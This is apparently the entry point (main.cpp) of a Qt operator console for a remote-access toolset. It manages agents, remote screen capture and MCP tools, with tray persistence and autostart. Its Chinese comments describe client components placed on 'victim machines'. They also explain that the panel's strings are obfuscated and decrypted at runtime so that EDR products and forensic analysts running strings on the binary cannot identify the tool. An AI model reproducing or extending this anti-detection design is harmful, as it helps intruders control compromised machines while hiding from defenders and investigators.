#include "ApiClient.h"
#include "AgentModel.h"
#include "McpBridge.h"
#include "ScreenStream.h"
#include "obf_strings_gen.h"   // 混淆字面量（与 Go 侧同源）
#include "TrayIcon.h"

#include <QGuiApplication>
#include <QQmlApplicationEngine>
#include <QQmlContext>
#include <QIcon>
#include <QDebug>
#include <QQuickStyle>
#include <QString>

// ═══════════════════════════════════════════════════════════════════════════
// 面板的兼容性适配要点（与客户端/服务端都不同，别照搬）
//
// 面板运行在**操作者自己的 Windows** 上，威胁模型不是"文件被投放到受害机"，
// 而是：
//   ① 本机安全产品/EDR 会扫 GUI 程序（窗口标题、进程名、磁盘二进制）
//   ② 取证者分析磁盘上的 panel.exe 时，strings 一下就知道这是什么工具
//
// .qml 文件会被 rcc 编成字符串塞进二进制，所以标题文字必须从 QML 里搬走，
// 改由 C++ 运行期解密后经 context property 传给 QML。
//
// 刻意**不**把标题伪装成 "Windows Explorer" 之类：一个自称资源管理器、
// 却带"远程截屏/MCP 工具"页签的程序，在任务栏里比原名更可疑。
// 保留产品名，只把它从静态明文里拿走 —— 这才是有意义的改动。
// ═══════════════════════════════════════════════════════════════════════════
static QString panelTitle() {
    return QString::fromStdString(::r6m::obf::Decode(::r6m::obf::R6M_OBFSEED_RMM_PANEL_3030816E));
}
static QString panelConsoleLabel() {
    // 中文字面量的 slug 为空（非 ASCII 全被过滤），常量名落成 R6M_OBFSEED_EMPTY_<seed>。
    // 这名字不好读，但唯一性由种子后缀保证；要改可读名请调整 manifest 里的写法。
    return QString::fromStdString(::r6m::obf::Decode(::r6m::obf::R6M_OBFSEED_EMPTY_11DFD517));
}

int main(int argc, char* argv[]) {
    QGuiApplication app(argc, argv);
    app.setApplicationName(panelTitle());
    // 关键：关窗后只是把窗口藏起来（收到右下角托盘继续跑），
    // 若保持默认的"最后一个窗口关闭即退出"，进程会当场结束 —— 托盘跟着消失。
    app.setQuitOnLastWindowClosed(false);
    app.setOrganizationName(QString());

    // 实测（2026-10-07）：默认使用 Windows 原生样式，它不支持自定义 Button.background，
    // 启动时刷 "The current style does not support customization of this control"，
    // 登录页的渐变按钮会被渲染成原生外观（自定义样式全被忽略）。
    // Basic 样式是官方文档给出的可定制样式，跨机器外观也一致。
    QQuickStyle::setStyle(QStringLiteral("Basic"));

    ApiClient api;
    AgentModel agentModel(&api);
    McpBridge mcp;
    // 屏幕监控独立于 McpBridge：见 ScreenStream.h 顶部说明
    // （McpBridge 是"一次调用一次结果" + 全局 busy，塞不进高频取帧）
    ScreenStream screenStream;

    QQmlApplicationEngine engine;
    // 实测（2026-10-07，Qt 6.9.3）：资源里的 QML 模块必须显式把 qrc 根加入导入路径，
    // 否则 `import RMMPanel`（对应 qmldir 里的 module RMMPanel）解析不到，
    engine.addImportPath(QStringLiteral("qrc:/"));
    // 右下角托盘 + 开机自启动
    TrayIcon tray;
    engine.rootContext()->setContextProperty("tray", &tray);
    engine.rootContext()->setContextProperty("api", &api);
    engine.rootContext()->setContextProperty("agentModel", &agentModel);
    engine.rootContext()->setContextProperty("mcp", &mcp);
    engine.rootContext()->setContextProperty("screenStream", &screenStream);
    // 标识串经运行期解密集成：qml 里不再出现明文标题（rcc 会把 qml 文本原样编进二进制）
    engine.rootContext()->setContextProperty("panelTitle", panelTitle());
    engine.rootContext()->setContextProperty("panelConsoleLabel", panelConsoleLabel());

    // 修复点：qml.qrc 的 prefix 是 /RMMPanel，条目是 main.qml，
    // 真实资源路径为 qrc:/ui/main.qml。原来写 qrc:/qml/main.qml，
    // 现象是"双击没有任何窗口"，GUI 下连错误提示都看不到。
    engine.load(QUrl(QStringLiteral("qrc:/ui/main.qml")));
    if (engine.rootObjects().isEmpty()) {
        qCritical() << "QML 加载失败: qrc:/ui/main.qml （检查 qml.qrc 是否已随 target 编译进资源）";
        return -1;
    }
    return app.exec();
}
